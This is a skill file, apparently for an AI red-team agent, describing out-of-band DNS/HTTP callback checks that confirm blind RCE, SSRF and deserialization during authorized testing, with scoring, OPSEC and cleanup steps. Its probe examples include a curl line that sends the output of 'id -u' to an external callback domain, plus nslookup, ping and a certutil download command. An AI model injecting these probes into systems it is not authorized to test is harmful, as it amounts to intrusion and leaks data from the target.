---
name: oob-verify
description: [Validation] OOB out-of-band verification: use DNS/HTTP callbacks to confirm blind RCE, SSRF, deserialization and command execution, avoiding "assumed it worked"
whenToUse: When blind-testing RCE/SSRF/deserialization/template injection and the HTTP response shows no result; or when you must prove the command actually executes on the target
role: vuln-scan
category: Validation
tags: [oob, dns, rce, ssrf]
enabled: true
---

# OOB Out-of-Band Verification

> Execute only **harmless probes**: `nslookup <token>`, `curl http://<token>`, `ping -c 1 <token>`. Do not use the OOB channel to run destructive commands; after confirmation, use `id`/`whoami`/a unique token for minimal verification.

## Prerequisites

- A publicly reachable callback endpoint: `interactsh-client`, or a self-hosted DNS/HTTP service on a VPS;
- An entry point where you can inject commands/URLs;
- Record the token and the time window so other noise is not misjudged as a hit.

## Flow

1. **Create a token**: `interactsh-client -v` to get a domain/URL; or start an HTTP service on the VPS that only logs requests;
2. **Inject a harmless probe**:
   ```text
   nslookup <token>.oob.example
   curl -s http://<token>.oob.example/$(id -u)
   ping -c 1 <token>.oob.example
   ```
   On Windows use `nslookup` / `certutil -urlcache -f http://...`; choose per target platform;
3. **Poll for callbacks**: confirm source IP, time, path/subdomain; if only DNS, record the resolution time;
4. **Minimal command verification**: after confirming the callback, use `id`/`whoami`/`hostname` or a unique string to confirm the execution context;
5. **Persist**: `redteam_vuln_add` (status=confirmed, `request`/`response` or payload/output) + the `command`/`result` of `score_hit`; the OOB record serves as `evidence_ref`.

## Determination

- DNS hit only: proves outbound DNS/resolution, not command execution; application-layer evidence is required;
- HTTP hit carrying command output: confirms RCE/command injection;
- Same token from multiple sources: distinguish target, proxy, CDN, scanner noise;
- No callback does not mean no vulnerability: egress may be blocked, DNS intercepted, or the payload inapplicable; retry with another protocol/port, and if still nothing, honestly mark it "unconfirmed".

## Scoring

- Blind RCE/command execution → `server-host` (normal/admin tier);
- SSRF into the intranet/cloud metadata → score `cloud-platform`/`internal`/`boundary-*` according to the actual result;
- Only proving SSRF egress without reading intranet data: record the vulnerability, do not force a high score;
- Boundary breakouts must supply entry/landing point/isolation/actual access evidence per the four questions.

## OPSEC

- Do not use target-organisation keywords in the OOB domain; randomize tokens;
- The callback service logs only necessary metadata, not unrelated data;
- Do not use OOB to execute downloads/staging/persistence unless the task explicitly requires it;
- After finishing, close listeners and clean up tokens/logs (your own), and register with `redteam_cleanup`.

## Handoff

Report back: entry point, payload, callback time/source, whether execution is confirmed, what privileges are obtainable; in `needs` state the missing callback infrastructure.
